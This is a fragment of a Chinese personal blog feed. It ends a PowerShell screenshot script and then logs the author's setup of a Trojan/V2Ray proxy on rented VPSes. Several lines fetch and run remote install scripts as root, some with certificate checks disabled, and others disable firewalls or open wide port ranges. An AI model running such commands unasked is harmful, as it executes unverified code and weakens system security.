+= <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">            <span class="comment">#use join-path to add path to filename</span></span><br><span class="line"></span><br><span class="line">            [<span class="built_in">String</span>] <span class="variable">$FilePath</span> = (<span class="built_in">Join-Path</span> <span class="variable">$Path</span> <span class="variable">$FileName</span>)</span><br><span class="line">            <span class="comment">#run screenshot function</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">Get-Screenshot</span></span><br><span class="line">            <span class="built_in">Write-Verbose</span> <span class="string">&quot;Saved screenshot to <span class="variable">$FilePath</span>. Sleeping for <span class="variable">$Interval</span> seconds&quot;</span></span><br><span class="line">            <span class="built_in">Start-Sleep</span> <span class="literal">-Seconds</span> <span class="variable">$Interval</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#note that this will run once regardless if the specified time as passed</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">While</span> ((<span class="built_in">Get-Date</span> <span class="literal">-Format</span> HH:mm) <span class="operator">-lt</span> <span class="variable">$EndTime</span>)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">Catch</span> &#123;<span class="built_in">Write-Error</span> <span class="variable">$Error</span>[<span class="number">0</span>].ToString() + <span class="variable">$Error</span>[<span class="number">0</span>].InvocationInfo.PositionMessage&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="进阶参考"><a href="#进阶参考" class="headerlink" title="进阶参考"></a>进阶参考</h2><p>上述链接还提到了以下内容，日后借鉴</p><p>调用组件通过SMTP发邮件</p><p>用System.Net.Mail.MailMessage组件调用SMTP发送邮件</p><p>脚本加密</p><p>生成随机名称和电话号码 <a href="https://blog.csdn.net/culun797375/article/details/108841296">https://blog.csdn.net/culun797375/article/details/108841296</a></p><p>PowerShell使用教程（转） - 调皮的小孩子的文章 - 知乎 <a href="https://zhuanlan.zhihu.com/p/88917107">https://zhuanlan.zhihu.com/p/88917107</a></p>]]></content>
      
      
      <categories>
          
          <category> 折腾吧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Trojan节点实现科学上网</title>
      <link href="2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E5%9F%BA%E4%BA%8ETrojan%E8%8A%82%E7%82%B9%E5%AE%9E%E7%8E%B0%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
      <url>2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E5%9F%BA%E4%BA%8ETrojan%E8%8A%82%E7%82%B9%E5%AE%9E%E7%8E%B0%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<h2 id="记一次基于Trojan搭建xx的经历"><a href="#记一次基于Trojan搭建xx的经历" class="headerlink" title="记一次基于Trojan搭建xx的经历"></a>记一次基于Trojan搭建xx的经历</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul><li><p>租一个vultr的vps，据说ipv6的最低有2.5$，优惠见网站<a href="https://www.vultryhw.cn/">https://www.vultryhw.cn/</a></p></li><li><p>vultr和namecheap两个都可以在国内访问2022.3.9实测</p><p>据说有个白嫖网站，<a href="https://www.freenom.com/zh/index.html?lang=zh">https://www.freenom.com/zh/index.html?lang=zh</a></p></li><li><p>域名A解析到vps的IP</p></li><li><p>vps安装依赖项命令：</p><p>centOS：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">centos：yum update -y &amp;&amp; yum install sudo newt curl -y &amp;&amp; sudo -i</span><br></pre></td></tr></table></figure><p><strong>debian</strong>、ubuntu：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install sudo whiptail curl locales -y &amp;&amp; sudo -i</span><br></pre></td></tr></table></figure></li><li><p>安装前确保打开80和443端口:</p><p>centos7 系列</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --state #查看防火墙状态</span><br><span class="line">firewall-cmd --list-ports #查看开放端口</span><br><span class="line">systemctl start firewalld #开启防火墙</span><br><span class="line">firewall-cmd --zone=public --add-port=6666/tcp --permanent #--zone #作用域 --add-port=6666/tcp  # 添加端口，格式为：端口/通讯协议 --permanent  # 永久生效，没有此参数重启后失效</span><br><span class="line">firewall-cmd --reload #重启防火墙</span><br><span class="line">netstat -ntlp #查看当前所有tcp端口·</span><br><span class="line">netstat -ntulp |grep 6666 #查看所有6666端口使用情况</span><br></pre></td></tr></table></figure><p>debian，ubuntu系列 打开80端口与查看80端口命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netstat -anp</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install ncat</span><br><span class="line">nc -lp 80 &amp;</span><br><span class="line">netstat -an | grep 80</span><br><span class="line">netstat -an | grep 80</span><br></pre></td></tr></table></figure><p>443端口操作同上</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装iptables查看端口（通常系统自带）</span><br><span class="line">apt-get install iptables</span><br></pre></td></tr></table></figure><blockquote><p>以下适合Linux Debian10操作系统的服务器，开启防火墙以及端口持久化的方法</p><p>如果遇到创建服务器的时候报错服务器错误，或者点击日志发现主机拒绝访问这种情况可能是服务器的防火墙没有开启</p><p>排查方法：telnet：port 看是否可以连通</p><p>如果没法连通需要开放防火墙端口 </p><p>首先安装 iptables（通常系统都会自带，如果没有就需要安装），使用以下命令 </p><p>sudo apt-get update </p><p>sudo apt-get install iptables </p><p>安装成功后使用以下命令开放一个个端口 </p><p>iptables -I INPUT -p tcp –dport 8080 -j ACCEPT </p><p>开启一个范围的端口</p><p>iptables  -A INPUT -p tcp –dport 51000：60000 -j ACCEPT</p><p>设置完就已经放行了指定的端口，但重启后会失效，所以需要设置持续生效规则： </p><p>输入以下安装 iptables-persistent </p><p>sudo apt-get install iptables-persistent </p><p>输入以下命令保存规则持续生效 </p><p>netfilter-persistent save </p><p>netfilter-persistent reload </p><p>完成之后端口就会持续开放。</p></blockquote></li><li><p>debian查看端口的方法：<a href="https://blog.51cto.com/u_14414732/2513736">https://blog.51cto.com/u_14414732/2513736</a></p></li><li><p>debian查看防火墙状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  apt-get install ufw <span class="comment">#hostus默认没安装防火墙</span></span><br><span class="line">  sudo ufw status</span><br><span class="line">/etc/init.d/ufw stop</span><br></pre></td></tr></table></figure><p>关闭：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw <span class="built_in">disable</span>|<span class="built_in">enable</span>  <span class="comment">#否则连接不上80和443端口</span></span><br><span class="line">或者开启ufw状态下，单独开放22,80和443端口，ufw allow 80</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">  参考：https:&#x2F;&#x2F;www.jb51.net&#x2F;os&#x2F;Ubuntu&#x2F;72109.html</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">### 踩坑</span><br><span class="line"></span><br><span class="line">- debian开放所有端口（这个一键安装教程真坑，真是一键入坑，关闭防火墙≠开启所有端口）</span><br><span class="line"></span><br><span class="line">  主要是用了这句：</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;bash</span><br><span class="line">  iptables -A INPUT -p tcp --dport 51000：60000 -j ACCEPT</span><br></pre></td></tr></table></figure><p>真坑，把1到65535全开了很不正常的吧，trojan原理是伪装，那这样本身会造成系统的不安全，而且端口全开也有一种大张旗鼓的感觉？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">以下适合Linux debian10操作系统的服务器，开启防火墙以及端口持久化的方法</span><br><span class="line"></span><br><span class="line">如果遇到创建服务器的时候报错服务器错误，或者点击日志发现主机拒绝访问这种情况可能是服务器的防火墙没有开启</span><br><span class="line"></span><br><span class="line">排查方法：telnet：prot 看是否可以连通</span><br><span class="line"></span><br><span class="line">如果没法连通需要开放防火墙端口</span><br><span class="line"></span><br><span class="line">首先安装 iptables（通常系统都会自带，如果没有就需要安装），使用以下命令</span><br><span class="line"></span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get install iptables</span><br><span class="line"></span><br><span class="line">安装成功后使用以下命令开放一个个端口</span><br><span class="line"></span><br><span class="line">iptables -I INPUT -p tcp --dport 8080 -j ACCEPT</span><br><span class="line"></span><br><span class="line">开启一个范围的端口</span><br><span class="line"></span><br><span class="line">iptables -A INPUT -p tcp --dport 51000：60000 -j ACCEPT</span><br><span class="line"></span><br><span class="line">设置完就已经放行了指定的端口，但重启后会失效，所以需要设置持续生效规则：</span><br><span class="line"></span><br><span class="line">输入以下安装 iptables-persistent</span><br><span class="line"></span><br><span class="line">sudo apt-get install iptables-persistent</span><br><span class="line"></span><br><span class="line">输入以下命令保存规则持续生效</span><br><span class="line"></span><br><span class="line">netfilter-persistent save</span><br><span class="line"></span><br><span class="line">netfilter-persistent reload</span><br><span class="line"></span><br><span class="line">完成之后端口就会持续开放。</span><br></pre></td></tr></table></figure></li><li><p>一键安装脚本：（不要用，用下面的新方法）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/johnrosen1/trojan-gfw-script/master/vps.sh)</span>&quot;</span> </span><br></pre></td></tr></table></figure><p>这个版本开发者更新后删除了v2ray，下面命令安装旧版本，可用于安装多个应用： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/harry3633/trojan-gfw-script/master/trojangui.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>输入解析好的域名</p></li><li><p>设置密码：wdnmd123</p></li><li><p>遇到的坑：centos内置防火墙，需要根据os版本提前关闭防火墙，vultr上默认安装的centos可能有默认的SELinux，除了关闭防火墙，还需要配置SELinux放行端口</p><ul><li><p>firewalld is not running解决方案<a href="https://jingyan.baidu.com/article/5552ef47f509bd518ffbc933.html">https://jingyan.baidu.com/article/5552ef47f509bd518ffbc933.html</a></p></li><li><p>坑中坑，真坑，累了看不到希望。。。</p></li></ul></li></ul><hr><ul><li>折腾了半天，得到的却是这么个结果：</li></ul><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210512202136445.png" alt="image-20210512202136445"></p><p>换方法，（这里换方法直接搜这里证书申请失败来着，于是发现了新方法）</p><hr><p><strong>小收获</strong></p><p>找方法时发现个好玩的<a href="http://luyiminggonnabeok.cn/2019/12/30/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAtraccar%E6%89%8B%E6%9C%BAGPS%E8%BF%BD%E8%B8%AA%E6%9C%8D%E5%8A%A1%E5%99%A8/">http://luyiminggonnabeok.cn/2019/12/30/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAtraccar%E6%89%8B%E6%9C%BAGPS%E8%BF%BD%E8%B8%AA%E6%9C%8D%E5%8A%A1%E5%99%A8/</a>    改天尝试一下用vps搭建traccar手机GPS追踪服务。</p><p>检查vps端口是否能访问的网址：<a href="https://www.toolsdaquan.com/ipcheck/">https://www.toolsdaquan.com/ipcheck/</a></p><hr><h3 id="hostus"><a href="#hostus" class="headerlink" title="hostus"></a>hostus</h3><h4 id="OpenVZ内的debian11"><a href="#OpenVZ内的debian11" class="headerlink" title="OpenVZ内的debian11"></a>OpenVZ内的debian11</h4><p>各种安装包安装不了，报错Temporary failure resolving ‘security.debian.org，这时需要临时使用另一个DNS服务器（例如Google的DNS服务器）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nameserver 8.8.8.8&quot;</span> | sudo tee /etc/resolv.conf &gt; /dev/null</span><br></pre></td></tr></table></figure><p>清空DNS缓存</p><p>sudo systemd-resolve –flush-caches</p><h3 id="zgocloud"><a href="#zgocloud" class="headerlink" title="zgocloud"></a>zgocloud</h3><p><a href="https://www.nodeseek.com/post-11476-1">https://www.nodeseek.com/post-11476-1</a></p><blockquote><p>国际网络 + AMD EPYC 7002 + 原生IP（无国内优化）<br>1 Core AMD EPYC 7002 Series<br>768 Mb DDR4 RAM<br>18G NVMe SSD<br>1 IPV4 &amp; /127 IPV6<br>1.5T/Month/1Gbps<br>International network, not optimized for China<br>$12.9 USD Annually</p></blockquote><p><a href="https://clients.zgovps.com/index.php?/cart/&amp;step=3">https://clients.zgovps.com/index.php?/cart/&amp;step=3</a></p><p>年付永久95折码：8NU44CM6LZ</p><h3 id="RackNerd"><a href="#RackNerd" class="headerlink" title="RackNerd"></a>RackNerd</h3><p>黑五优惠<a href="https://t.co/77SQdzps9a">https://t.co/77SQdzps9a</a>  这个10美元，后来发现这个不稳定</p><blockquote><p>10.18刀每年，算是比较便宜的RN机型，建议选择圣何塞（San Jose）地区。<br>配合俺手撸的一键脚本（下附）安装Hysteria2，速度还是能跑起来的。72小时内IP被墙可免费更换，购买页有测试IP，可测一下延时：<br>1 vCPU<br>15 GB SSD<br>768 MB RAM<br>1000GB 月流量<br>1 IPv4 &amp; KVM<br>$10.18 / 年（续费同价）</p></blockquote><p>debian10 因为 Debian 发行版已经发布了新的版本，导致旧版本从 ‘stable’ 变成了 ‘oldstable’ 或 ‘oldoldstable’。这意味着你的系统需要确认这些变更，才能继续使用这些软件源进行更新。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update --allow-releaseinfo-change <span class="comment"># 运行命令来接受软件源的变更</span></span><br></pre></td></tr></table></figure><p>由于以上zgo和rn经常不稳定（当然，可以通过增加kcptun窗口到8000来牺牲流量为代价缓解）</p><p>还是再推荐几个vps厂家</p><h3 id="virmach"><a href="#virmach" class="headerlink" title="virmach"></a>virmach</h3><p>virmach.com 一年12刀 每月500G，速度和之前hostus加上kcp之后一样好</p><p>hostus是不做openVZ了，KVM价格上去了</p><h4 id="黑五活动"><a href="#黑五活动" class="headerlink" title="黑五活动"></a>黑五活动</h4><h3 id="unesty"><a href="#unesty" class="headerlink" title="unesty"></a>unesty</h3><p><a href="https://server.unesty.net/">https://server.unesty.net/</a></p><p>可以装win， 50欧一年（400rmb）</p><p>4vpu16G，带宽稳定无限 200G磁盘 RDP流畅</p><h3 id="prepaid"><a href="#prepaid" class="headerlink" title="prepaid"></a>prepaid</h3><p><a href="https://prepaid-host.com/en">https://prepaid-host.com/en</a></p><p>同上面规格差不多</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><a href="http://www.myzitong.com/article/ciogji.html">http://www.myzitong.com/article/ciogji.html</a></p><h2 id="脚本部署"><a href="#脚本部署" class="headerlink" title="脚本部署"></a>脚本部署</h2><h3 id="VPS部署"><a href="#VPS部署" class="headerlink" title="VPS部署"></a>VPS部署</h3><h4 id="trojan脚本"><a href="#trojan脚本" class="headerlink" title="trojan脚本"></a>trojan脚本</h4><p>先上结果：c23e1df9</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210512203634914.png" alt="image-20210512203634914"></p><p>参考教程：<a href="https://www.v2rayssr.com/trojan-2.html">https://www.v2rayssr.com/trojan-2.html</a></p><p>在采用此教程之前经历了一次旧方法的失败，所以可能已经具备了旧方法的一些事前准备：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210512205300533.png" alt="image-20210512205300533"></p><p>除了旧方法的防火墙关闭，打开80和443端口，更新依赖项的命令之外，别的应该没影响了。</p><p>下面说新方法的正式步骤：</p><h4 id="安装半自动化脚本："><a href="#安装半自动化脚本：" class="headerlink" title="安装半自动化脚本："></a>安装半自动化脚本：</h4><p>1、检查SELinux是否关闭，本文用的是Debian，不存在SELinux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/sestatus -v      <span class="comment">##如果返回参数为enabled即为开启，disabled为关闭</span></span><br></pre></td></tr></table></figure><p>2、安装基础依赖环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install wget    <span class="comment">##ContOS Yum 安装 wget</span></span><br><span class="line">apt-get install wget   <span class="comment">##Debian Ubuntu 安装 wget</span></span><br></pre></td></tr></table></figure><p>3、运行Trojan安装代码</p><p>分3行，一行一行复制，有条不紊，出问题好查错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget -N --no-check-certificate <span class="string">&quot;https://raw.githubusercontent.com/V2RaySSR/Trojansh/master/trojan1.sh&quot;</span> &amp;&amp; chmod +x trojan1.sh &amp;&amp; ./trojan1.sh</span><br><span class="line"></span><br><span class="line">检查安装依赖，少什么自动补什么</span><br><span class="line">本过程安装了sudo/nginx/wget/unzip/zip/curl/tar/trojan</span><br><span class="line">现在你访问 http://liloker.club 应该有伪装站点的存在了</span><br><span class="line">伪装站点目录在 /usr/share/nginx/html 可自行更换网站</span><br><span class="line">Trojan配置文件在 /usr/<span class="built_in">local</span>/etc/trojan</span><br><span class="line">检测没有问题之后可以进行下一部分安装</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget -N --no-check-certificate <span class="string">&quot;https://raw.githubusercontent.com/V2RaySSR/Trojansh/master/trojan2.sh&quot;</span> &amp;&amp; chmod +x trojan2.sh &amp;&amp; ./trojan2.sh</span><br><span class="line"></span><br><span class="line">第二步，证书申请及安装，由于脚本申请次数限制，这步容易报错，如果出错，可以到此教程的youtube链接中查看</span><br><span class="line">手动申请证书完成后的操作：</span><br><span class="line">1、证书申请下来后请粘贴到/usr/<span class="built_in">local</span>/etc/trojan目录</span><br><span class="line">2、证书文件改名为 cert.crt</span><br><span class="line">3、秘钥文件改名为 private.key</span><br><span class="line">若完成上述步骤可跳过此脚本并进行第三部分脚本的操作</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget -N --no-check-certificate <span class="string">&quot;https://raw.githubusercontent.com/V2RaySSR/Trojansh/master/trojan3.sh&quot;</span> &amp;&amp; chmod +x trojan3.sh &amp;&amp; ./trojan3.sh</span><br><span class="line"></span><br><span class="line">这步配置trojan服务器端，结束后https://www.liloker.club输入完整网址成功，同时存在https://liloker.club和http://liloker.club这样不安全的网址</span><br><span class="line"></span><br><span class="line">若需修改密码或忘记密码</span><br><span class="line">请访问VPS: /usr/<span class="built_in">local</span>/etc/trojan/config.json</span><br><span class="line"></span><br><span class="line">PC的v2ray配置时地址填域名，填ip时返回503，可能是因为这个IP 是共享的，服务器根据 Request 的 Header 中 host 值来确定路由到哪台应用服务上，可使用打开 postman，仍然通过 IP 访问，添加 host 参数，值为域名，Send 请求后返回是否为正常的页面内容来判断</span><br></pre></td></tr></table></figure><p>结束后即出现开头的图：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210512203634914.png" alt="image-20210512203634914"></p><p>配套视频教程：<a href="https://www.youtube.com/watch?v=RBNKJ7iUtm0">https://www.youtube.com/watch?v=RBNKJ7iUtm0</a></p><p>4、安装BBRPLUS加速（命令已失效）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -N --no-check-certificate <span class="string">&quot;https://github.com/ylx2016/Linux-NetSpeed/releases/download/sh/tcp.sh&quot;</span> &amp;&amp; chmod +x tcp.sh &amp;&amp; ./tcp.sh</span><br></pre></td></tr></table></figure><p>链接404了…</p><p>后面单独开一个BBR加速部分，先跑起来再加速。</p><h4 id="手动安装步骤"><a href="#手动安装步骤" class="headerlink" title="手动安装步骤"></a>手动安装步骤</h4><p><a href="https://www.v2rayssr.com/trojanssl.html">https://www.v2rayssr.com/trojanssl.html</a></p><p>配套视频 <a href="https://www.youtube.com/watch?v=hWZKbaV3xDk">https://www.youtube.com/watch?v=hWZKbaV3xDk</a></p><h4 id="trojan服务端"><a href="#trojan服务端" class="headerlink" title="trojan服务端"></a>trojan服务端</h4><p><a href="https://github.com/trojan-gfw/trojan/releases">https://github.com/trojan-gfw/trojan/releases</a></p><h4 id="hysteria2-amp-reality一键脚本"><a href="#hysteria2-amp-reality一键脚本" class="headerlink" title="hysteria2&amp;reality一键脚本"></a>hysteria2&amp;reality一键脚本</h4><p><a href="https://github.com/yeahwu/v2ray-wss">https://github.com/yeahwu/v2ray-wss</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/yeahwu/v2ray-wss/main/tcp-wss.sh &amp;&amp; bash tcp-wss.sh</span><br></pre></td></tr></table></figure><blockquote><p>已测试系统如下：</p><p>Debian 9, 10, 11, 12</p><p>Ubuntu 16.04, 18.04, 20.04, 22.04</p><p>CentOS 7</p></blockquote><p>WSS客户端配置信息保存在： <code>cat /usr/local/etc/v2ray/client.json</code></p><p>Shadowsocks客户端配置信息： <code>cat /etc/shadowsocks/config.json</code></p><p>Reality客户端配置信息保存在： <code>cat /usr/local/etc/xray/reclient.json</code></p><p>卸载方法如下： <a href="https://1024.day/d/1296">https://1024.day/d/1296</a></p><p>卸载ss-libev，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop shadowsocks</span><br><span class="line">rm /usr/<span class="built_in">local</span>/bin/ssserver</span><br><span class="line">rm /etc/systemd/system/shadowsocks.service</span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><p>卸载 v2ray-wss 命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop v2ray`</span><br><span class="line">`systemctl stop nginx</span><br><span class="line">bash &lt;(curl -L https://raw.githubusercontent.com/v2fly/fhs-install-v2ray/master/install-release.sh) --remove</span><br><span class="line">apt purge nginx -y</span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><p>卸载 Reality 命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop xray</span><br><span class="line">bash -c <span class="string">&quot;<span class="subst">$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)</span>&quot;</span> @ remove</span><br></pre></td></tr></table></figure><p>卸载 Hysteria2 命令如下：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -fsSL https://get.hy2.sh/) --remove</span><br></pre></td></tr></table></figure><hr><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>Trojan各个平台客户端: <a href="https://ww6866.xyz/portal/page/download?client=ios">https://ww6866.xyz/portal/page/download?client=ios</a></p><h4 id="windows：v2rayN"><a href="#windows：v2rayN" class="headerlink" title="windows：v2rayN"></a>windows：v2rayN</h4><p>新方法给的链接都挂掉了，去github上找找</p><p><strong><a href="https://github.com/2dust/v2rayN/releases/tag/4.15">https://github.com/2dust/v2rayN/releases/tag/4.15</a> 宝藏链接，下载里面的core版本就可以在win客户端运行，如果不行，可能是.NET版本有问题</strong></p><p>查了下，自己的win10上好像也没有.NET framework。。。。。。</p><h5 id="reality-amp-hy2"><a href="#reality-amp-hy2" class="headerlink" title="reality&amp;hy2"></a>reality&amp;hy2</h5><p>reality详解：<a href="https://www.v2ray-agent.com/archives/1680104902581">https://www.v2ray-agent.com/archives/1680104902581</a></p><hr><h5 id="虚拟机win7-x64尝试："><a href="#虚拟机win7-x64尝试：" class="headerlink" title="虚拟机win7 x64尝试："></a>虚拟机win7 x64尝试：</h5><p>下载后在虚拟机的win7上报错：程序停止运行</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210513144900521.png" alt="image-20210513144900521"></p><p>按要求安装了4030319.1版本，结果又报错：错误代码：clr20r3</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210513145855108.png" alt="image-20210513145855108"></p><p>需要更新.NET framework，参考链接：V2ray依赖项.NET framework框架安装： <a href="https://dotnet.microsoft.com/download/dotnet-framework/thank-you/net472-web-installer">https://dotnet.microsoft.com/download/dotnet-framework/thank-you/net472-web-installer</a> 安装失败，说是网络原因，找到下载源官网下载<a href="https://dotnet.microsoft.com/download/dotnet-framework/net472%E3%80%82">https://dotnet.microsoft.com/download/dotnet-framework/net472。</a></p><p>又报错，这次说证书错误<img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210513144639710.png" alt="image-20210513144639710"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210513172707714.png" alt="image-20210513172707714"></p><p>崩溃。。。。。。</p><hr><p>后来在<a href="https://bbs.csdn.net/topics/391822424%E5%8F%91%E7%8E%B0%E5%8F%AF%E8%83%BD%E5%B0%B1%E6%98%AFnet%E6%A1%86%E6%9E%B6%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E5%A5%87%E4%BA%86%E6%80%AA%E4%BA%86%EF%BC%8C%E6%88%91%E5%B0%B1%E6%98%AF%E6%8C%89%E8%A6%81%E6%B1%82%E5%AE%89%E8%A3%85%E7%9A%84%E9%82%A3%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84%E6%A1%86%E6%9E%B6%EF%BC%8C%E4%B8%8D%E8%B5%B7%E4%BD%9C%E7%94%A8%E4%BA%86%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%9B%9E%E7%AD%94%E6%89%AF%E5%88%B0%E7%B3%BB%E7%BB%9F%EF%BC%8C%E4%BA%8E%E6%98%AF%E6%88%91%E6%8A%8A%E8%BD%AF%E4%BB%B6%E4%BB%8E%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8B%96%E5%88%B0%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E5%B0%B1%E8%BF%90%E8%A1%8C%E6%88%90%E5%8A%9F%E4%BA%86%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E6%88%91%E6%9C%89%E7%82%B9%E6%80%80%E7%96%91%E6%98%AF%E4%B9%8B%E5%89%8D%E6%8A%93%E5%8C%85%E5%9C%A8%E7%B3%BB%E7%BB%9F%E9%87%8C%E7%95%99%E7%9A%84%E8%AF%81%E4%B9%A6%E5%BD%B1%E5%93%8D%E7%9A%84%E3%80%82%E3%80%82%E3%80%82">https://bbs.csdn.net/topics/391822424发现可能就是net框架版本的问题，奇了怪了，